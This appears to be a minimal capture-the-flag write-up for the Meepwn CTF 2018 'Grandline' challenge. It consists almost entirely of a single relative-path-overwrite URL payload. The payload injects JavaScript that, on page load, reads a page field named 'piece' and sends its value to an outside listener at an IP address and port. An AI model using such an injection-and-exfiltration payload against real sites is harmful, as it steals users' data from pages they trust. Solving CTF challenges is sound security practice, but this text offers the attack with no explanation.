# Meepwn CTF 2018 Quals : Grandline

## Write-up

- RPO attack

```
http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/..;/%0a*/%0awindow.onload=function(){var x=new Image();x.src=`http://174.138.24.108:1234/`%2bdocument.getElementsByName(`piece`)[0].value;aasdf;}%0acharset%20(/*/*
```
